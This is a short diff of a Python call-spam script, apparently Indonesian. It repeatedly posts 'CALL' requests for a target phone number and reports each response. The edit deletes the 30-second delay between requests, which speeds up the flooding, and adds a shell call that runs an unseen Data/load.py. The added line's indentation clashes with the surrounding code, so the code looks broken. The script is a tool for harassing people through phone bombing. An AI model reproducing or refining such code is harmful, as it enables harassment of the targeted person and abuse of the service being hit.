@@ -50,8 +50,8 @@ dat = {"method": "CALL","countryCode": "id",}
 try:
 	for i in range(jumlah):
 	    send = requests.post(url+nomor, headers=ua, data=dat)
-	    time.sleep(30)
 	    print(Fore.WHITE+"[\033[1;93m•"+Fore.WHITE+"] Status -► ",(send.json()["message"]))
+            os.system("cd Data && python load.py")
 	print (Fore.WHITE+"Spam Selesai "+Fore.GREEN+"✓")
 
 except NameError: 
